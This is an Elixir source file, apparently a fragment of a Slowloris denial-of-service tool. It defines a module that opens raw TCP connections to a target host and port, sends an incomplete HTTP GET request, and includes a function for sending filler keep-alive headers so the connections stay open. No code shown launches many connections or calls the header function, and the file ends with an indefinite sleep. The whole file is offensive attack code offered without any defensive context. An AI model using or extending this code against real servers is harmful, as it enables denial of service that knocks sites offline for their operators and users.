defmodule SlowLoris do
  require Logger
  def start_connection(target, port) do
    case :gen_tcp.connect(String.to_charlist(target), port, [:binary, packet: :raw, active: false]) do
      {:ok, socket} ->
        :gen_tcp.send(socket, "GET / HTTP/1.1\r\n")
        :gen_tcp.send(socket, "Host: #{target}\r\n")
        socket
      {:error, _} ->
        :error
    end
  end

  def send_header(socket) do
    case :gen_tcp.send(socket, "X-a: keep-alive\r\n") do
      :ok -> :ok
      {:error, reason} ->
        Logger.info("#{inspect(self())} - #{reason}")
        :ok
    end
  end
end

:timer.sleep(:infinity)
